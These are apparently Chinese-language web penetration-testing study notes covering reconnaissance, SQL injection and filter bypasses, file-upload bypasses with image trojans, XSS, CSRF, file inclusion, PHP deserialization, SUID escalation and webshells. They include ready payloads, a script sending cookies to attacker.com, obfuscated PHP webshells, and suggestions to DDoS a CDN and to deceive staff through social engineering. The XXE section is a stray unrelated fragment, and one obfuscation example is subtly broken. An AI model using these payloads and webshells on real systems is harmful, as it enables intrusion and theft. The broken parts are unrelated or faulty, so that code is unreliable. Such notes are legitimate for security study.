# 信息收集

渗透测试和渗透攻击的第一步是收集目标信息，俗称踩点。信息收集得越全面，就越容易找到防御薄弱点。较重要的信息包括：

- 基础信息：域名、真实IP、开放端口
- 应用信息：主机上运行了哪些程序，以及它们的版本
- 目录信息：主机上的目录和文件
- 防护信息：WAF，防火墙等

这些信息也叫网络资产信息，[网络空间资产探测与分析技术研究](https://www.gjbmj.gov.cn/n1/2022/0422/c411145-32406257.html)列出的信息以及收集方法如下表。不过这篇文章讲的更多是大规模数据搜集与分析，和网络渗透稍有不同，列在这里仅作参考

| 分类     | 包括                                                         | 相关信息                 | 常用收集方法                      |
| -------- | ------------------------------------------------------------ | ------------------------ | --------------------------------- |
| 硬件资产 | 各种网络设备，如主机、路由器、防火墙                         | 设备型号、网络拓扑结构   | 响应头部数据、banner等            |
| 软件资产 | 网络设备上运行的软件，如操作系统、服务器框架、数据库管理系统、第三方应用等 | 安装了哪些软件、软件版本 | 响应头部数据、特殊URL、开放端口等 |
| 数据资产 | 业务类型、业务数据等                                         |                          |                                   |

## 被动搜集

被动搜集指不直接访问目标，通过其他渠道获取目标信息。被动搜集较为隐蔽，通常不会留下痕迹，信息搜集的第一步通常都是被动搜集

- **网络空间测绘工具**：俗称”黑暗搜索引擎“，可以获取目标的开放端口、使用的服务等信息
  - [FOFA](https://fofa.info/)
  - [Shodan](https://www.shodan.io/)（[语法参考](https://help.shodan.io/the-basics/search-query-fundamentals)）
  - [钟馗之眼](https://www.zoomeye.org/)
  - [鹰图平台](https://hunter.qianxin.com/)
  - https://quake.360.net/quake/#/index
  - https://x.threatbook.cn

- **搜索引擎**：用Google等搜索引擎直接搜索目标网站相关信息，如公开的页面，新闻报导乃至配置文件、后台登录页面。用搜索引擎寻找关键信息称作Google Hacking或Google Dorking
- **网站信息查询工具**：[爱站网](https://www.aizhan.com/)、[站长之家](https://tool.chinaz.com/)等网站集成了Whois域名查询、[ICP备案信息](https://beian.miit.gov.cn)查询、Ping检测等多项功能
- **社会工程学**：从官网、社交媒体等渠道获取相关人员信息，联系这些人并骗取目标信息

## 基础信息

### 子域名

子域名和目标或多或少有联系，而且防护不一定有主域名那么严密，后续可以在其中找防护薄弱的目标

- 测绘工具：搜索`domain=target.com`
- 搜索引擎：`site:target.com -site:www.target.com`
- 信息查询工具：[子域名查询](https://tool.chinaz.com/subdomain/)
- 爆破

### IP地址

- DNS查询：`nslookup`
- 测绘工具
- 信息查询工具：[DNS查询](https://tool.chinaz.com/dns)，或者[Ping检测](https://ping.chinaz.com/)、[get-site-ip](https://get-site-ip.com/)

若网站有多个IP地址，网站很可能使用了CDN（Content Distribution Network）、反向代理等，需要绕过CDN节点**寻找真实IP地址**

- **相关域名**：相关站点经常在相同IP或同一C段，可尝试寻找子域名、父域名地址，若它们没开CDN就能从此地址找到主站
- **邮件服务**：网站发出邮件不可用CDN，可从该站点发出的邮件源码分析（比如验证邮件、RSS邮件订阅）
- **国外地址请求**：一般不会为海外地址部署CDN，从国外访问到的可能是真实地址。最暴力的可以从全球访问，其中必定有服务器真实地址
- **搜索特征文件**：部分文件不会缓存在CDN上，可以在网络测绘工具搜索这样的文件
- **DNS历史记录**：如[IP地址查询](https://site.ip138.com/)，找启用CDN之前的ip
- **DDoS攻击**：打光网站CDN流量

找到疑似真实IP后，首先可以多方法互相验证；然后可以尝试改Hosts，能正常访问就说明找到真实IP地址了

### 端口及服务

找到真实IP地址后，就可以检查有哪些开放端口、各端口运行什么服务

1. 测绘工具
2. nmap扫描

```shell
nmap -sn example.com/24	    # 主机发现
nmap -sS exmample.com       # 扫描开放端口
nmap -sS -sV $target -p 443 # 识别端口的服务
```

除了目标本身以外，还可以扫旁注（同一IP地址的其他网站）、C段（`/24`IP段的其他网站）。有可能从中找到防御薄弱点

## 应用信息

获取应用信息的主要方式是指纹识别，即通过服务器返回数据的特征识别服务器使用了哪些应用程序（服务器软件、中间件、CMS等）。例如访问一个不存在的页面，看到Apache的默认404页面就可以推断服务器使用Apache；发现部分资源路径包含`wp-content`，可以推断服务器使用Word Press

### 操作系统

- **大小写敏感**：修改路径大小写（注意域名不区分大小写，要改域名以外的部分，比如将`example.com/news`改成`example.com/NEws`），若正常显示则说明服务器不区分大小写
  - Windows一般不区分大小写；Windows WSL和Windows 10以上版本可以配置区分大小写；Linux区分；MacOS默认不区分，但可以配置

### 数据库

- **常见搭配**：可通过操作系统、服务器软件简单判断数据库，也可以反过来用数据库推断其他信息
  1. Linux + apache / Nginx + PHP + MySQL
  2. Linux + Tomcat + JSP + MySQL / Oracle
  3. Windows + IIS + ASP.NET + MSSQL
  4. Windows + IIS + ASP + Access
- **开放端口**：如MySQL默认端口为3306，如果扫到3306端口开放/过滤，很可能使用MySQL

### 指纹识别工具

nmap的服务识别就是一种指纹识别；wappalyzer（浏览器插件），御剑，[webanalyzer](https://github.com/webanalyzer/rules)，[whatweb](https://whatweb.net/)等工具可用于识别网页服务器的指纹

## 目录信息

寻找目录、文件信息，有可能发现敏感文件

Fuzz Scan：暴力破解。字典：Web-Fuzzing-Box，fuzzDicts

## 防护信息

wafw00f用于识别waf。防护的识别和绕过都是较难的部分

# Web漏洞

## SQL注入

### 流程

1. **寻找注入点**：在文本后面加入单引号、双引号、括号、双括号，若有报错则可能存在SQL注入。所有和数据库有关的地方都可能出现注入，GET参数、POST参数、HTTP头、URL都不要错过

2. **闭合语句**：尝试构造合法语句。例如完整查询语句为`SELECT * FROM users WHERE id=('$id') LIMIT 1`，需要构造注入内容`1') -- `让它成为合法语句。大多数时候都是黑盒测试，需要结合经验尝试单引号、双引号、反引号、括号等
   - 注意，若注入点是用引号括起来的数字，比如`id='1'`，MySQL会尝试`'1'`转换为数字再查找。因此即使引号没匹配`id=('1 or 1=1')`、被转义`id='1\'`，都能看似正常的返回。不要被骗

3. **构造注入语句**

```sql
# SELECT
SELECT * FROM users WHERE id='1' ORDER BY 4;          # 判断数据列数
SELECT * FROM users WHERE id='1' UNION SELECT 1,2,3;  # UNION查询

# UPDATE
UPDATE users SET name='hacker' WHERE id='114514';   # 改变写入的内容与条件
UPDATE users SET name='user' WHERE id='' and (SELECT substring(pwd,1,1))='a';  # 盲注
```

4. **获取数据**
   - 判断数据库类别：https://websec.readthedocs.io/zh/latest/vuln/sql/dbident.html
   - 数据库管理系统信息：版本`version()`，用户名`user()`，数据库名`database()`，操作系统`@@version_compile_os`
   - 数据库结构：MySQL等数据库将结构信息存在`information_schema`数据库中，可跨库查询（一般需要较高权限）

| 表名       | 字段名                                  | 包含信息                             |
| ---------- | --------------------------------------- | ------------------------------------ |
| `schemata` | `schema_name`                           | 数据库名                             |
| `tables`   | `table_name, table_schema`              | 表名，以及该表所属数据库名           |
| `columns`  | `column_name, table_name, table_schema` | 字段名，以及该字段所属表名、数据库名 |

```sql
-- 示例：获取users表的列名
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users';
```

### 盲注

web应用进行数据库操作之后可能不会回显，比如只显示“查询成功”或“查询失败”，甚至连成功与否都不告诉用户。这种情况下通过注入获取信息的方法就叫盲注。参考：[一文搞定MySQL盲注](https://www.anquanke.com/post/id/266244)

#### 布尔盲注

1. 找注入点
2. 构造条件。这个条件的真假影响回显。例如若payload`' or '1'='1`回显“查询成功”，`' or '1'='2`回显“查询失败”，这个payload就是合格的条件
3. 将条件替换成注入的数据，例如下面的语句。替换参数，不断尝试直到爆破出整条数据

```sql
SELECT * FROM users WHERE id='' or length(database()) < 16;
SELECT * FROM users WHERE id='' or substr(database(), 1, 1) = 'a';
```

常用的字符串截取方法：

```sql
SELECT substr('a', 1, 1), mid('a', 1, 1), right('a', 1), left('a', 1);
regexp, rlike, trim, insert, like;
```

#### 延时盲注

若完全没有回显，可以利用延时判断条件真假，若查询成功则会延迟一段时间再响应（注意：sleep函数找到多少条结果就会延迟多少次，比如`sleep(0.1)`搜索到20条结果就会延迟$0.1 \times 20 = 2$秒，可以用这个方法判断表的行数

```sql
SELECT name FROM users WHERE id='' UNION SELECT IF((1=1), sleep(5), 0);
SELECT name FROM users WHERE id='' UNION SELECT CASE WHEN (1=1) THEN sleep(5) ELSE 0 END;
SELECT name FROM users WHERE id='' UNION SELECT sleep(5*(1=1));
```

网站可能禁`IF`等关键字，按需灵活选取。`sleep`也有以下替代方法（**以下方法都要注意不要引起DOS**）：

```sql
SELECT benchmark(1000000, sha1('a'));    # 重复执行sha实现延时
SELECT count(*) FROM users A, users B;   # 笛卡尔积延时
SELECT rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');  # 正则状态机复杂匹配
```

#### 报错盲注

若服务器没有回显，又禁用了延时盲注的关键字，可以尝试构造SQL ERROR。查询成功、查询失败、SQL报错可能是三套处理逻辑，只要报错的结果和另外两个有区别就能强行获得回显

```sql
SELECT exp(709 + (1=1));
SELECT cot(1 - (1=1));
SELECT pow(1 + (1=1), 99999);
```

### 其他注入手段

#### 文件操作

以下代码可以读写文件，不过仅限`SELECT @secure_file_priv;`指定的目录

```sql
SELECT '<?php @eval($_POST[aaa]);?>' INTO OUTFILE 'shell.php'
SELECT load_file('backup.bak')
```

#### 报错注入

如果服务器显示错误信息，可构造查询语句使数据直接显示在错误信息中

向MySQL 5.1以上版本的`updatexml(XML_document, XPath, new_value)`和`extractvalue(XML_document, XPath)`函数传递不合法XPath，报错信息中包含XPath的值。下面例子用`~user_name`作为XPath，XPath不能包含`~`，因此必定报错，报错信息中包含了用户名

```sql
SELECT updatexml(1, concat(0x7e, (select user())), 2)
```

下面语句据说利用随机GROUP BY有概率爆出错误，[参考](https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/#0x01-%E5%8F%8C%E6%9F%A5%E8%AF%A2)，但我无法复现

```sql
SELECT count(*),concat((select user()),floor(rand()*2))a FROM information_schema.columns GROUP BY a
```

#### 堆叠注入

一次注入多条语句。不过数据库API不一定支持

```sql
SELECT * FROM users WHERE id=1; drop users();
```

#### 二次注入

例如，注册用户名`admin' -- `，注册时没有发生注入；但是当数据库读取用户名做进一步操作时，开发者有可能误以为从数据库取得的数据是干净的，就没有清洗，因此引发注入。比如该用户修改密码的SQL语句可能如下，实际上修改了admin用户的密码

```sql
UPDATE users SET pwd='pswd' WHERE name='admin' -- 
```

### 防护

- **预编译**、**参数化查询**：将语句和数据分离。一般是安全的，但表名、列名不能被占位符替代，如果允许拼接可能也有问题
- **过滤**
  - **`addslashes`**：PHP的`addslashes`函数将单引号、双引号、反斜杠、NULL转义为`\', \", \\, \0`。有的服务器会配置**魔术引号**（Magic Quotes），自动将外部来源（HTTP参数、读取文件、读数据库）的文本用反斜杠转义。本意并不是防SQL注入的，只是恰好起到了一点效果
  - **`mysql_real_escape_string`**：`addslashes`的上位替换。但是安全性也没有高很多
  - **字符过滤**：禁用空格、引号、注释等特殊符号
  - **关键字过滤**：用正则匹配`UNION`等常用于渗透攻击的关键字，删除它或者干脆拒绝访问（这种方法效率低、防不全，还容易把正常用户拦住）

- **内容检查**：检查参数内容，比如只允许用整数查询，或者检测到不正确日期格式就拒绝请求

### 绕过

编码：使用特殊编码、特殊转义方式，绕过网站的转义和关键字检查

- **宽字节注入**：对于使用反斜杠（`0x5c`）转义的防护手段，可以在合适位置插入一个字节，让它“吞掉”反斜杠
  - 若服务器使用utf-8、数据库使用GBK，注入`%df' or 1=1`，经过魔术引号变为`%df\' or 1=1`；前两个字节`%df%5c`被数据库当成一个gbk字符`運`，反斜杠被”吞掉“。详见[宽字节注入深度讲解](https://cs-cshi.github.io/cybersecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/)。第一个字节可以是`0x81~0xa0, 0xa8~0xfd`的任意一个
  - 若使用utf-8编码，注入`%c0' or 1=1`，转义后前两字节为`%c0%5c`，被当作一个字符（因为UTF-8是变长编码，用最高几个比特辨认字符使用多少字节，`%c0`前3比特为`0b110`，被当作是一个长2字节的字符，详见[维基百科](https://en.wikipedia.org/wiki/UTF-8#Description)）。一般称作**Overlong Encoding**漏洞

- **二次编码注入**：进行两次百分号编码，如`' ' -> %20 -> %25%20`；对普通字符编码，如`u%6eion`。若开发者错误地在SQL参数的转义、过滤后再进行一次URI解码，可导致注入
- **替换符号**：逻辑绕过（尽量不用被过滤的关键字）+ 同义绕过（使用相同含义的其他写法）。参见[SQL注入绕过速查表](https://github.com/BaizeSec/bylibrary/blob/main/docs/%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8.md)

```sql
-- 空格过滤：注释/**/、其他空白符。参见上面的速查表链接
-- 空格过滤：浮点数、括号、反引号（表名、列名可用反引号括起）
SELECT name FROM users WHERE id=1e0union(select`pw`from`users`where(id=1));
-- 引号过滤：数字绕过(例子中数字是admin的编码); and,or过滤：||, &&绕过。&记得转义成%26
SELECT * FROM users WHERE id=-1||name=0x61646d696e;
-- 函数式编程绕过各种运算符。下面例子判断database()第一个字符码值是否大于64
SELECT * FROM users WHERE id=-1||least(substr(database(),1,1),'a')like'a';
-- 闭合引号、括号绕过注释
SELECT * FROM users WHERE id=('0')union(select'a',database(),'b') LIMIT 0,1;
-- Join查询绕过逗号
SELECT id, name FROM users WHERE id="0"union select * from ((select 1)A join (select 2)B);
-- from for绕过逗号（只对substr和mid有用）
SELECT * from users WHERE id=-1 || substr(database() from 1 for 1)='a';
```

小技巧参考：https://websec.readthedocs.io/zh/latest/vuln/sql/ref.html#tricks

## 文件上传

网站若未对用户上传的文件类型、内容或执行权限做严格限制，攻击者可以上传恶意文件（如 WebShell、病毒等）进行攻击

### 防护

- **文件校验**：检验文件合法性
  - **简单校验**：利用HTML表单、javascript、MIME类型校验

  - **文件名校验**：检测扩展名并进行黑名单 / 白名单过滤。更严格一点的会把文件名也给改了，比如改成`时间戳.jpg`

  - **文件头Magic Number**：读取文件前几个字节判断文件格式，如JPEG文件应以`FF D8 FF`开头，PNG为`89 50 4E 47`，GIF为`GIF89a`

- **存储隔离**：放在静态资源目录，禁止解析

- **图像处理**：进行图像处理后重新保存

### 绕过

#### 文件校验绕过

1. **冷门后缀**：php可能解析`php5` / `pht` / `phtml` / `shtml` / `pwml`；jsp可能解析`jspf` / `jspa` / `jsw` / `jsv` / `jtml` 等后缀；asp支持 `asa` / `asax` / `cer` / `cdx` / `aspx` / `ascx` / `ashx` / `asmx` / `asp{80-90}` 等后缀；`vbs, sh, reg, com, cgi, exe, cfc, cfm`等后缀也可能可以利用。较新版本的服务器基本不可能成功
2. **系统命名绕过**：Windows系统可尝试`shell.php.`（末尾句点）、`shell.php%20`（末尾空格）、`shell.php:1.jpg`（冒号）、`shell.php::$DATA`（文件流）；Linux系统可尝试`index.php/.`、`./aa/../index.php/.`
3. **`.user.ini`文件**：适用于PHP 5.3以上，需要服务器处于CGI / Fast CGI模式，且上传目录下有PHP脚本，比如index.php。构造配置文件`auto_prepend_file=01.gif`，访问同一目录的php脚本时自动运行`01.gif`
4. **`.htaccess`文件**：适用于apache服务器，需要服务器配置`AllowOverride`（也有说法称需要开启`rewrite`模块、需要Thread Safe版本PHP）

```htaccess
# 将所有文件名包含pwn的文件作为php解析
<FilesMatch "pwn">
    Sethandler application/x-httpd-php
</FilesMatch>
```

#### 图片木马

包含恶意代码的图片俗称图片马。恶意代码插入于图片文件结束标记之后，或EXIF元数据，不影响图片显示；但将图片马作为代码执行时，比如用文件包含漏洞，解释器解析执行`<?php ?>`或`<% %>`中的代码。和图种的原理类似

1. 随便准备一张图片`a.jpg`
2. 构造恶意代码。通常用“一句话木马”，即非常简短的木马，其隐蔽性较好。后续可用它作为跳板上传大木马
   - PHP：`<?php @eval($_GET['cmd']); ?>`
   - aspx：`<%@ Page Language="Jscript"%>`
   - 这么直白的写法肯定会被杀毒软件发现，需要结合代码混淆实现免杀。可参考[Webshell集合](https://github.com/tennc/webshell)
3. 将图片和代码拼接到一起。或者用Photoshop、PIL等将木马写入图片EXIF

```shell
cat a.jpg shell.php > shell.jpg           # Linux
copy a.jpg /b + shell.php /a > shell.jpg  # Windows
```

## 跨站脚本（XSS）

跨站脚本（Cross-Site Scripting，简称XSS。第一个字母改为X以避免和样式层叠表CSS冲突）是网站显示用户输入（比如，论坛发帖）时，字符串被浏览器误当作代码解析执行从而产生危害。例如下面的文本若被当作javascript执行，将在用户不知情之下将Cookie发送到攻击者服务器，攻击者可以用它进行会话劫持攻击

```html
<script>
    var img = new Image();
    img.src = "http://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);
</script>
```

XSS只能影响到用户前端，无法直接作用于服务器

- **反射型**：恶意代码写在URL内，如`example.com?q=<script>alert(1);</script>`，打开此链接便收到攻击。易受攻击的功能有搜索等
- **存储型**：恶意代码存储在服务器中，打开对应页面便受到攻击。易受攻击的功能有评论、文章、用户个人资料等
- **DOM型**：污染动态加载的数据，则浏览器解析数据时就会受到攻击。易受攻击的功能有前端渲染搜索、聊天等

可以执行恶意代码的HTML标签有：

```html
<script>alert();</script>
<img src="x" onerror="alert();" />
<a href="javascript:alert();">Click Me</a>
```

### 防护

- 转义
- 输入校验
- `httponly`

### 绕过

安全的转义方式（如`htmlspecialchars`）是没有办法绕过的，除非网页结构特殊（如允许用户操作`a[href]`，或者包含了一个具有XSS漏洞的网页。这两种情况可以不定义新HTML标签、不更改给现有标签的属性而实现XSS）。不过，用户输入和回显形式多样，开发者可能会误以为某些输入是安全的所以不转义，或者干脆忘记转义。渗透测试就是要寻找这些不起眼的用户输入和显示，比如HTTP头、`input[type=hidden]`等隐藏元素

首先试着注入单引号、双引号、HTML标签、URI转义、HTML实体，如`1'2"<b>&#x61;&#x3a;%41</b>`如果都被转义就可以找下一个目标了

## 跨站请求伪造（CSRF）

跨站请求伪造（Cross-Site Requet Forgery，CSRF）利用用户浏览器的Cookie，以用户名义在目标网站上执行攻击操作。例如：

1. 用户登录银行网站，会话保持有效
2. 用户访问攻击者的恶意页面，该页面隐藏一个自动提交的请求，如`<img src="http://bank.com/transfer?to=attacker&amount=1000 />"`
3. 用户的浏览器自动携带Cookie发送请求，银行网站误认为是合法操作，执行转账

防御措施通常有：

- CSRF Token
- SameSite Cookie
- 验证Referer

## 服务器端请求伪造（SSRF）

服务器端请求伪造（Server-Side Request Forgery，SSRF）是攻击者通过操纵服务器发出请求获取敏感信息，常用于内网横向

## 远程代码执行（RCE）

远程代码执行（Remote Code Execution，RCE），也叫任意代码执行（Artibrary Code Execution，ACE）。网站使用`eval`等函数时，若用户可控制参数，则可以执行任意代码

过滤绕过：https://wiki.wgpsec.org/knowledge/ctf/exec.html

使用其他漏洞也有可能实现任意代码执行，比如用文件上传漏洞传一个WebShell，自然什么代码都能执行了。但这种间接实现RCE的通常不叫作RCE漏洞

## 文件包含

开发者常通过函数（如PHP的`include`、`require`）将其他文件的内容引入当前脚本，例如加载配置文件、复用代码模块。当**用户输入用于文件路径**且未做严格过滤时，攻击者可以篡改路径，包含非预期的文件（如系统文件、远程脚本）

- **本地文件包含**（Local File Inclusion，LFI）：包含服务器本地文件，可用于窃取敏感信息，或配合文件上传漏洞执行任意代码
- **远程文件包含**（Remote File Inclusion，RFI）：包含远程服务器文件（需要服务器开启`allow_url_include`配置），直接执行恶意代码

**LFI利用方式**

- 文件上传漏洞
- PHP封装协议
- 日志文件：如果服务器日志保存UA等信息，甚至可以将webshell注入到日志，再包含日志文件
- 临时文件
  - POST方法上传`multipart/form-data`，PHP会将文件存为临时文件，位于`php.ini`指定的`upload_tmp_dir`，默认为`/tmp`，文件名是`php + 4或6位随机字母/数字`，如`/tmp/phpY1WgtV`（可以在phpinfo的PHP Variables部分看到），php脚本运行结束后删除
  - 在一次请求上传并利用临时文件：需要能够猜到临时文件名，比如使用通配符调用文件。CTF中有可能，实际业务中没有可行性
  - 让PHP崩溃阻止删除临时文件：难度较大，取决于PHP版本

## 逻辑漏洞

逻辑漏洞是业务逻辑设计缺陷导致的漏洞。此类漏洞一般不会直接引起安全问题，但往往可以成为攻击切入口

### 越权访问

**绕过访问控制逻辑**，进行未授权的操作。可以细分为**水平越权**，使用A账号获取、操作B账号的数据；**垂直越权**，使用低权限账号进行高权限操作

发现数据包中传输用户信息（用户编号、用户组编号等）时，可以尝试修改这个值进行水平越权。如果知道高权限用户的数据包结构，还可以尝试垂直越权

绕过其他业务逻辑实现本来不允许的操作也可以叫做广义的逻辑越权，比如通过修改UA访问移动端页面（虽然这种操作不算漏洞，一般也没有危害性），或者

### 业务漏洞

绕过业务逻辑，如修改优惠券金额、预测验证码、覆盖注册等

### 敏感信息泄露

包括但不限于：用户名、口令、个人数据（如姓名，住址，电话等）。代码、配置、日志、备份中都可能包含敏感信息

## 反序列化

序列化和反序列化就是将对象转换为文本，以及将文本转换回对象的功能，它常用于对象的保存和传输。若Web应用未执行严格过滤，可以构造恶意数据，在反序列化过程中执行危险操作

解析认证token、Session，传输json和XML、使用RMI协议时都可能有反序列化漏洞

### PHP

#### 简介

PHP的`serialize`函数将对象转换为字符串，其中包括了对象的类名、属性名和属性值；`unserialize`函数将字符串转换回对象

```php
class Connection {
    # 属性
    protected $db;
    private $user, $pass;
    # 方法
    private function connect(){
        $this->db = new PDO('mysql:host=localhost;dbname=test', $this->user, $this->pass);
    }
    # 魔术方法
    public function __construct($user, $pass){
        $this->user = $user;
        $this->pass = $pass;
    }
    public function __sleep(){
        return array('user', 'pass');
    }
    public function __wakeup(){
        // this->connect();
        echo "wakeup\n";
    }
    public function __destruct(){
        $this->db = null;
    }
}

$conn = new Connection("John Doe", "p@ssword");
echo serialize($conn);
'O:10:"Connection":2:{s:16:"Connectionuser";s:8:"John Doe";s:16:"Connectionpass";s:8:"p@ssword";}'
```

序列化字符串中，

- `O`：表示这是一个对象（数组则是A）
- `10:"Connection"`：类名长度为10，值为`Connection`
- `2`：有2个属性
- `s:16:"Connectionuser"`：第一个属性名，它是字符串（`s`），长度为16，名为`Connectionuser`（private属性名会加上一些别的东西，8.2版本是类名，其他版本也有加空字节的）
- `s:8:"John Doe"`：第一个属性值。含义同上

`__wakeup`，`__destruct`都是与反序列化漏洞强相关的魔术方法，反序列化必定调用它们；其他魔术方法也可能被调用。假如`__wakeup`中有危险代码，或服务器用反序列化得到的对象进行危险操作，控制序列化字符串就能进行攻击了。不过，开发者不太可能犯这么大的错，一般需要用后面几节的技术

#### POP链

面向属性编程链（Property-Oriented Programming Chain，也叫Gadget Chain）

#### phar文件

phar文件是PHP代码和资源的压缩包，其中以序列化形式存储了phar元数据。PHP以`phar://`封装协议访问phar文件时会反序列元数据。结合文件上传漏洞 + 可以控制文件名的文件操作（例如`example.com/download?file=phar://phar.gif`）就能利用反序列化攻击

## XXE

```python
payload = f"hex(hex(substr((select flag from flag) from {i} for 1))),/"
print(f"[] Testing position {i}, payload: {payload}")
```

# 操作系统漏洞

[GTFOBins](https://gtfobins.github.io/)收录了许多用Linux指令绕过操作系统安全策略的方法

## SUID

SUID是“set uid ID upon execution”的缩写。用户运行具有SUID的程序时，会暂时获得文件所属用户的权限，比如更改密码的程序`/usr/bin/passwd`拥有者是root，且具有SUID，普通用户运行此程序时可以暂时获得root权限，修改密码文件`/etc/shadow`，但用正常方法就无法篡改`/etc/shadow`

```bash
sudo -l  # 查看当前用户能sudo的指令
find / -perm -u=s -user root -type f 2>/dev/null  # 查找SUID指令
```

能用SUID提权的指令有：wget

# 其他

## 转义

URI、HTML、SQL

php: `htmlspecialchars`；mysqli：`mysqli_real_escape_string`

## webshell

### php

```php
# 基础webshell
eval($_GET['cmd']);

# 用字符串操作隐藏危险函数assert。其他类似方式：preg_replace, str_rot13
$a = str_replace('ass*e**rt', '*', '');
$a($_GET['kqbnjf']);

# 用php特性做字符串操作，隐藏危险函数
echo ~('和'[2]);     # 打印s。和的utf-8编码第三个字节是0x8c，取反得到0x73，正是s的编码
$x = gettype([])[0]; # gettype([]) = 'array'，因此给$x赋值为'a'
echo ++$x;           # 打印b。

# 动态传入危险函数
$a = $_GET['xymhwv'];
$a($_GET['ehnzmq']);
```









